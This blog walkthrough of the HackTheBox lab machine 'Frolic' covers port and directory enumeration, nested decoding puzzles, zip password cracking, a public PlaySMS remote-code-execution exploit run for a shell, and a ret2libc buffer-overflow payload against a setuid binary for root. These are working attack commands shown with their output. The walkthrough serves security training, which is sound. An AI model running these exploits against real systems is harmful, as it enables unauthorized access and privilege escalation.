---
layout: single
classes: wide
title:  "Walkthrough - Frolic"
date: 2019-03-24
categories:
    - "hackthebox"
    - walkthrough
tags:
    - machines
    - easy
    - linux
---

This was a good practice of decoding stuff, web exploitation and rop exploitation. Overall a decent box and easy points. Getting user was tiring but root was fun and it did give me some ideas on future blog posts.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/banner.PNG)

Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)

First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).

```bash
root@noone:/home/pswapnil/Curling# nmap -v -p- -sC -sV -oA nmap 10.10.10.111
# Nmap 7.70 scan initiated Thu Feb 14 11:48:48 2019 as: nmap -v -p- -sC -sV -oA nmap 10.10.10.111
Nmap scan report for 10.10.10.111
Host is up (0.25s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m31s, median: 0s
| nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FROLIC<00>           Flags: <unique><active>
|   FROLIC<03>           Flags: <unique><active>
|   FROLIC<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2019-02-14T22:41:15+05:30
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-02-14 12:11:15
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 14 12:11:21 2019 -- 1 IP address (1 host up) scanned in 1353.08 seconds
```

A few ports are open, basically running SSH, SMB and HTTP. Let's start with the HTTP.
Visting the pages, I found this..

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/web1.png)

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/web2.png)

Let's use `wfuzz` on `http://10.10.10.111:9999/`

```bash
root@noone:/home/pswapnil/Retired/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/FUZZ > fuzzresult
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                         

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.111:9999/FUZZ
Total requests: 950

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000060:  C=301      7 L       13 W          194 Ch        "admin"
000111:  C=301      7 L       13 W          194 Ch        "backup"
000834:  C=301      7 L       13 W          194 Ch        "test"
000273:  C=301      7 L       13 W          194 Ch        "dev"

Total time: 25.19004
Processed Requests: 950
Filtered Requests: 946
Requests/sec.: 37.71331
```

Let's visit these pages and go from there.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/adminweb2.png)

The admin page is so weird. Let's look at the source.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/loginadminweb2.png)

Well, there's the username and password, let's try it out.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/successweb2.png)

Excellent! But this open's up another weird page.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/weird.png)

I just copy pasted the string in a google search, and the first result was of a programming language, ook! Fortunately the link was for a decoder. Let's use that.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/ook.png)

Well that's something. Got another directory. Let's go there.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/b64text.png)

Not again. Well at least it's not weird, it's base64, at least look like it. I will copy the text in a file and try to decode it.

```bash
pswapnil@noone:~/Retired/Frolic$ base64 -d out.b64 > b64result
pswapnil@noone:~/Retired/Frolic$ file b64result
b64result: Zip archive data, at least v2.0 to extract
pswapnil@noone:~/Retired/Frolic$ mv b64result b64result.zip
pswapnil@noone:~/Retired/Frolic$ unzip b64result.zip
Archive:  b64result.zip
[b64result.zip] index.php password:
root@noone:/home/pswapnil/Retired/Frolic# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt b64out.zip


PASSWORD FOUND!!!!: pw == password
root@noone:/home/pswapnil/Retired/Frolic# unzip b64out.zip
Archive:  b64out.zip
[b64out.zip] index.php password:
  inflating: index.php
root@noone:/home/pswapnil/Retired/Frolic# cat index.php
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

Let's convert the hex to ascii using some tool. This is getting boring now.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/htoa.png)

Oh would you just! Again some base64. I am sure this time because of the padding.

```bash
pswapnil@noone:~/Retired/Frolic$ base64 -d htoa > htoab64out
root@noone:/home/pswapnil/Retired/Frolic# cat htoab64out
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

I know this. This is Brainfuck! Literally. Let's decode something again...

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/bfdec.png)

All that for some weird text. Nothing to go on now. Let's move to another directory from the list.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/bkp.png)

Two files. Let's visit the path ...

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/user.png)
![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/pass.png)

I could not see the `/dev` path so, I tried a `wfuzz` on it.

```bash
root@noone:/home/pswapnil/Retired/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/dev/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.111:9999/dev/FUZZ
Total requests: 950

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000111:  C=301      7 L       13 W          194 Ch        "backup"
000834:  C=200      1 L        1 W            5 Ch        "test"

Total time: 24.70471
Processed Requests: 950
Filtered Requests: 948
Requests/sec.: 38.45419
```

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/devbkp.png)

Another URL. Let's go there.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/psms.png)

A login form. Let's try the two usernames and passwords we have until now. The tuple `(admin:idkwhatispass)` worked and we are in something.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/psmslogin.png)

I did a searchsploit on `playsms` and got this.

```bash
root@noone:/home/pswapnil/Retired/Frolic# searchsploit playsms
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                               |  Path
                                                                                                                                                                                             | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                                                           | exploits/php/remote/44598.rb
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                                                           | exploits/php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                                                             | exploits/php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                                                       | exploits/php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                                                                                                                                                          | exploits/php/webapps/42038.txt
PlaySms 0.7 - SQL Injection                                                                                                                                                                  | exploits/linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                                                               | exploits/php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                                                        | exploits/php/webapps/7687.txtHappy Hacking! Cheers!

PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                                                                      | exploits/php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                                                                 | exploits/php/webapps/30177.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

I used this [exploit](https://github.com/jasperla/CVE-2017-9101) to get a shell.

```bash
root@noone:/home/pswapnil/Retired/Frolic/CVE-2017-9101# python3 playsmshell.py --password idkwhatispass --url http://10.10.10.111:9999/playsms -i
[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
[+] Entering interactive shell; type "quit" or ^D to quit
> whoami
www-data

> pwd
/var/www/html/playsms
```

So we have a low privilege shell. Using some `stty` and `python` magic, I was able to upgrade to a full shell.

```bash
www-data@frolic:/home/ayush$ cat user.txt
2******************************0
```

Looking around, we have the `user.txt` file. On to root!

```bash
www-data@frolic:/home/ayush/.binary$ ls -l
total 8
-rwsr-xr-x 1 root root 7480 Sep 25 00:59 rop
```

I found a `rop` binary in the home directory of `ayush`. I am assuming that we would have to do some `rop` to do privilege escalation. So let's check for `ASLR`.

```bash
www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space
0
```

So, ASLR is disabled. I downloaded the binary on my local machine to try and debug it.

```bash
root@kali# ./rop
[*] Usage: program <message>

root@kali# ./rop $(python -c 'print "A"*10')
[+] Message sent: AAAAAAAAAA

root@kali# ./rop $(python -c 'print "A"*500')
Segmentation fault
```

I will be posting a tutorial `rop` exploitation soon. But, long story short, I got the addresses for `SYSTEM`, `exit` and `/bin/sh` on the box and used them to create an exploit and did the following.

```bash
www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
# id
root
# cat root.txt
8******************************2
```

Voila! We have the `root.txt` file.
It was a decent box except the continuous decoding. But obtaining the root was a good exercise.

Happy Hacking! Cheers!
